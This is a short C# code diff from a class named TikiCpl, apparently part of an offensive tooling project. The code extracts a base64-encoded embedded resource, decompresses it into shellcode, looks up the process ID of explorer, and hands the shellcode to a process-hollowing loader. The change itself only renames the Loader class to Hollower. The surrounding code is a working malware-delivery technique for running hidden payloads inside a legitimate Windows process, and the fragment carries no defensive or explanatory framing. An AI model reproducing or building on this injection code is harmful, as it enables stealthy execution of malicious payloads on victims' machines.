@@ -47,7 +47,7 @@ public class TikiCpl
 
         string scode = ExtractResource("TikiCpl.Resource.txt");
         byte[] blob = Convert.FromBase64String(scode);
-        byte[] shellcode = Loader.DecompressShellcode(blob);
+        byte[] shellcode = Hollower.DecompressShellcode(blob);
 
         if (shellcode.Length == 0) return IntPtr.Zero;
             int ppid = FindProcessPid("explorer");
@@ -56,7 +56,7 @@ public class TikiCpl
                 Environment.Exit(1);
             }
 
-            var ldr = new Loader();
+            var ldr = new Hollower();
 
         try
         {
